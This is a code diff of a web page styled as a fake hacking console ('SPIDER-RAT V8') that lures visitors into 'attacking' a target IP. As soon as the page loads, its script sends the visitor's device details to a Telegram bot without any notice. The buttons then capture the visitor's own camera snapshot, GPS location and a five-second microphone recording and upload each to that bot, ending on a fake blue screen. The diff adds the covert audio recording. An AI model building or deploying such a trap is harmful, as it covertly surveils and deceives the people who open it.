@@ -3,53 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL | SPIDER-RAT EXECUTION</title>
+    <title>CENTRAL COMMAND | SPIDER-RAT V8</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        :root { --red: #ff0000; --dark-red: #440000; --glow: 0 0 15px #ff0000; }
-        body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; margin: 0; overflow: hidden; text-transform: uppercase; }
-        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.4; }
-        .scanner { position: fixed; top: 0; left: 0; width: 100%; height: 5px; background: rgba(255, 0, 0, 0.2); box-shadow: 0 0 20px var(--red); animation: scan 4s linear infinite; z-index: -1; }
+        :root { --red: #ff0000; --glow: 0 0 15px #ff0000; }
+        
+        body { 
+            background: #000; color: var(--red); 
+            font-family: 'Share Tech Mono', monospace; 
+            margin: 0; overflow: hidden; text-transform: uppercase; 
+        }
+
+        /* خلفية الماتريكس */
+        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.3; }
+
+        /* خط الليزر المتحرك */
+        .scanner { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 3px; 
+            background: var(--red); box-shadow: 0 0 15px var(--red); 
+            animation: scan 3s linear infinite; z-index: -1; 
+        }
         @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
+
         .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; position: relative; }
         .active { display: flex !important; }
-        .frame { border: 1px solid var(--red); background: rgba(0, 0, 0, 0.9); padding: 30px; position: relative; box-shadow: inset 0 0 20px var(--dark-red), var(--glow); width: 90%; max-width: 450px; clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); }
-        h1, h2 { text-shadow: var(--glow); letter-spacing: 5px; margin: 10px 0; }
-        input { background: transparent; border: 1px solid var(--dark-red); color: #fff; padding: 12px; width: 100%; box-sizing: border-box; margin: 15px 0; outline: none; font-family: inherit; text-align: center; }
-        button { background: var(--red); color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; letter-spacing: 2px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); transition: 0.3s; margin-top: 10px; }
-        button:hover { background: #fff; transform: scale(1.02); }
-        .loader-wrap { width: 100%; border: 1px solid var(--dark-red); height: 10px; margin: 15px 0; }
+
+        /* صندوق الواجهة الاحترافي */
+        .frame { 
+            border: 1px solid var(--red); background: rgba(0, 0, 0, 0.95); 
+            padding: 25px; box-shadow: inset 0 0 20px #400, var(--glow); 
+            width: 90%; max-width: 420px; 
+            clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); 
+        }
+
+        h1, h2 { text-shadow: var(--glow); letter-spacing: 5px; margin: 10px 0; font-size: 1.5rem; text-align: center;}
+        
+        input { 
+            background: transparent; border: 1px solid #400; color: #fff; 
+            padding: 12px; width: 100%; box-sizing: border-box; margin: 15px 0; 
+            outline: none; font-family: inherit; text-align: center; 
+        }
+
+        button { 
+            background: var(--red); color: #000; border: none; padding: 12px; 
+            width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; 
+            margin-top: 8px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); 
+            transition: 0.3s;
+        }
+        button:hover { background: #fff; color: #f00; }
+
+        .loader-wrap { width: 100%; border: 1px solid #400; height: 10px; margin: 15px 0; }
         .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
-        .status-log { font-size: 11px; color: #888; text-align: left; height: 60px; overflow: hidden; }
-        #controlPanel { display: none; width: 100%; flex-direction: column; gap: 10px; margin-top: 20px; }
+        
+        #controlPanel { display: none; width: 100%; flex-direction: column; gap: 8px; }
+
+        /* شاشة الموت الزرقاء */
+        #bsod { 
+            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
+            background:#0000aa; color:#fff; padding:50px; font-family:sans-serif; z-index:9999; 
+        }
     </style>
 </head>
-<body onload="initSystem()">
+<body onload="initSilentReport()">
 
 <canvas id="matrixCanvas"></canvas>
 <div class="scanner"></div>
 
+<div id="bsod">
+    <h1 style="font-size: 100px;">:(</h1>
+    <h2>Your PC ran into a problem and needs to restart.</h2>
+    <p>We're just collecting some error info, and then we'll restart for you. (0% complete)</p>
+</div>
+
 <div id="screen1" class="screen active">
     <div class="frame">
-        <h1>ACCESS GATE</h1>
-        <p style="font-size: 12px; color: #666;">SECURE CHANNEL INITIALIZED</p>
+        <h1>SPIDER COMMAND</h1>
+        <p style="font-size: 10px; color: #666; text-align: center;">ENCRYPTED SATELLITE LINK</p>
         <input type="text" id="targetIp" placeholder="ENTER TARGET IPV4">
-        <button onclick="trapAction()">EXECUTE ATTACK</button>
-        <p style="font-size: 9px; color: #444; margin-top: 10px;">AUTHORIZED USERS ONLY</p>
+        <button onclick="startExploit()">LAUNCH ATTACK</button>
     </div>
 </div>
 
 <div id="screen2" class="screen">
     <div class="frame">
-        <h2 id="statusHeader">EXECUTING...</h2>
+        <h2 id="statusHeader">INITIALIZING...</h2>
         <div id="loadingArea">
             <div class="loader-wrap"><div id="bar" class="progress"></div></div>
-            <div id="status-log" class="status-log"></div>
+            <p style="font-size: 10px; text-align: center;">BYPASSING FIREWALLS...</p>
         </div>
         <div id="controlPanel">
-            <button onclick="startCapture()" style="background: #fff; color: #f00;">📸 GET CAMERA FEED</button>
-            <button onclick="getLocation()">📍 TRACE GPS LOCATION</button>
-            <button onclick="location.reload()" style="background: #333; color: #fff;">TERMINATE SESSION</button>
+            <button onclick="startCapture()">📸 LIVE CAMERA FEED</button>
+            <button onclick="getLocation()">📍 GPS LIVE TRACE</button>
+            <button onclick="recordAudio()" id="audioBtn">🎙️ LISTEN SURROUNDING</button>
+            <button onclick="selfDestruct()" style="background: #333; color: var(--red); border: 1px solid var(--red);">💣 SELF DESTRUCT</button>
         </div>
     </div>
 </div>
@@ -60,107 +106,105 @@
         chatId: "1268323143"
     };
 
-    // --- Matrix Background ---
+    // --- تأثير الماتريكس ---
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     const drops = Array(Math.floor(canvas.width/20)).fill(1);
-    function drawMatrix() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    function drawM() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
         ctx.fillStyle = "#f00"; ctx.font = "15px Arial";
         drops.forEach((y, i) => {
-            const text = String.fromCharCode(Math.random() * 128);
-            ctx.fillText(text, i*20, y*20);
+            ctx.fillText(String.fromCharCode(Math.random() * 128), i*20, y*20);
             if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
             drops[i]++;
         });
     }
-    setInterval(drawMatrix, 33);
+    setInterval(drawM, 40);
 
-    // --- الصيد الصامت (بمجرد الفتح) ---
-    async function initSystem() {
-        let batteryInfo = "UNAVAILABLE";
+    // --- الصيد الصامت بمجرد الدخول ---
+    async function initSilentReport() {
+        let bat = "N/A";
         if (navigator.getBattery) {
-            const bt = await navigator.getBattery();
-            batteryInfo = `${(bt.level * 100).toFixed(0)}% (${bt.charging ? "CHARGING ⚡" : "ON BATTERY 🔋"})`;
+            const b = await navigator.getBattery();
+            bat = `${(b.level*100).toFixed(0)}% ${b.charging ? '⚡' : '🔋'}`;
         }
-
-        const silentMsg = `📡 **SILENT REPORT - INTRUDER**\n` +
-                          `🔋 BATTERY: ${batteryInfo}\n` +
-                          `📶 NETWORK: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}\n` +
-                          `📱 PLATFORM: ${navigator.platform}\n` +
-                          `🧠 CORES: ${navigator.hardwareConcurrency}\n` +
-                          `🌍 LANG: ${navigator.language}`;
-        
-        sendToBot(silentMsg);
+        const msg = `🚨 **INTRUDER LOGGED IN**\n🔋 BAT: ${bat}\n📱 SYS: ${navigator.platform}\n🌐 NET: ${navigator.connection?.effectiveType || 'N/A'}\n🧠 CORES: ${navigator.hardwareConcurrency}`;
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
-    async function sendToBot(text) {
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.chatId, text: text, parse_mode: "Markdown" })
-        });
-    }
-
-    async function trapAction() {
+    function startExploit() {
         const ip = document.getElementById('targetIp').value;
         if(!ip) return alert("TARGET IP REQUIRED");
         
-        sendToBot(`🎯 **MISSION ENGAGED**\nTargeting: ${ip}\nCapturing Initial Metadata...`);
-        
         document.getElementById('screen1').classList.remove('active');
         document.getElementById('screen2').classList.add('active');
-        runTerminal();
-    }
-
-    function runTerminal() {
-        const bar = document.getElementById('bar');
-        const log = document.getElementById('status-log');
-        const msgs = ["> BYPASSING SECURITY...", "> INJECTING PAYLOAD...", "> ACCESSING KERNEL...", "> ENCRYPTING PACKETS..."];
-        let p = 0; let i = 0;
-        const interval = setInterval(() => {
-            p += 25; bar.style.width = p + "%";
-            if(i < msgs.length) log.innerHTML += msgs[i++] + "<br>";
+        
+        let p = 0;
+        const int = setInterval(() => {
+            p += 25; document.getElementById('bar').style.width = p + "%";
             if(p >= 100) {
-                clearInterval(interval);
+                clearInterval(int);
                 document.getElementById('loadingArea').style.display = 'none';
-                document.getElementById('statusHeader').innerText = "ACCESS GRANTED";
+                document.getElementById('statusHeader').innerText = "SYSTEM ACCESS GRANTED";
                 document.getElementById('controlPanel').style.display = 'flex';
             }
         }, 1200);
     }
 
+    // --- سحب الصور ---
     async function startCapture() {
-        alert("SYNCING SATELLITE FEED...");
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video'); video.srcObject = stream; await video.play();
-            const canvasCap = document.createElement('canvas');
-            canvasCap.width = video.videoWidth; canvasCap.height = video.videoHeight;
+            const c = document.createElement('canvas'); c.width = video.videoWidth; c.height = video.videoHeight;
             setTimeout(async () => {
-                canvasCap.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvasCap.toBlob(res, 'image/jpeg'));
-                const fd = new FormData();
-                fd.append('chat_id', CONFIG.chatId);
-                fd.append('photo', blob, 'victim.jpg');
-                fd.append('caption', "📸 **VISUAL DATA CAPTURED**");
+                c.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
+                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('photo', blob, 'snap.jpg');
                 fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
                 stream.getTracks().forEach(t => t.stop());
-                alert("CAPTURE SUCCESSFUL.");
+                alert("SATELLITE IMAGE RECEIVED.");
             }, 1000);
-        } catch(e) { alert("ERROR: TARGET DEVICE BLOCKED CAMERA ACCESS"); }
+        } catch(e) { alert("ERROR: TARGET BLOCKED ACCESS"); }
     }
 
+    // --- سحب الموقع ---
     function getLocation() {
-        alert("PINGING GPS MODULE...");
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                sendToBot(`📍 **LOCATION SEIZED**\n[Open Map](https://www.google.com/maps?q=${lat},${lon})`);
-                alert("COORDINATES SYNCED.");
-            }, () => alert("ERROR: GPS SIGNAL LOST"));
+        navigator.geolocation.getCurrentPosition(p => {
+            const msg = `📍 **LOCATION SEIZED**\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}`);
+            alert("COORDINATES SYNCED.");
+        }, () => alert("GPS SIGNAL BLOCKED"));
+    }
+
+    // --- تسجيل الصوت ---
+    async function recordAudio() {
+        const btn = document.getElementById('audioBtn');
+        btn.innerText = "🔴 RECORDING...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('voice', blob, 'rec.ogg');
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+                btn.innerText = "🎙️ LISTEN SURROUNDING";
+                alert("AUDIO PACKET SENT.");
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني
+        } catch(e) { alert("MIC ACCESS DENIED."); btn.innerText = "🎙️ LISTEN SURROUNDING"; }
+    }
+
+    // --- التدمير الذاتي ---
+    function selfDestruct() {
+        if(confirm("ARE YOU SURE? THIS WILL TERMINATE THE TARGET DEVICE CONNECTION.")){
+            document.getElementById('bsod').style.display = "block";
+            setTimeout(() => { location.href = "https://www.google.com"; }, 6000);
         }
     }
 </script>
